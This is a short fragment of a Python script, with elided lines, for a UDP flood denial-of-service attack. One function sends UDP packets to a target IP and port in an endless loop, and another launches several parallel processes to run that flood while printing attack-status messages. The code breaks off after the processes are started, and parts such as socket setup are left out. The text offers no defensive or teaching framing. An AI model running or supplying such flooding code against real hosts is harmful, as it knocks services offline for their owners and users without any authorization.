...
def udp_flood(ip, port):
    while True:
        ...
        try:
            ...
            s.sendto(b'message', (ip, port))
            print(f"[+] Sent UDP Packet to {ip}:{port}")
            s.close()
        except Exception as e:
            print(f"[x] Failed to send UDP Packet: {e}")
            return

def flood_ip(ip, port, num_processes):
    print("[+] Starting UDP Flood Attack...")
    start_time = time.time()
    jobs = []

    for i in range(num_processes):
        p = multiprocessing.Process(target=udp_flood, args=(ip, port))
        jobs.append(p)
        p.start()
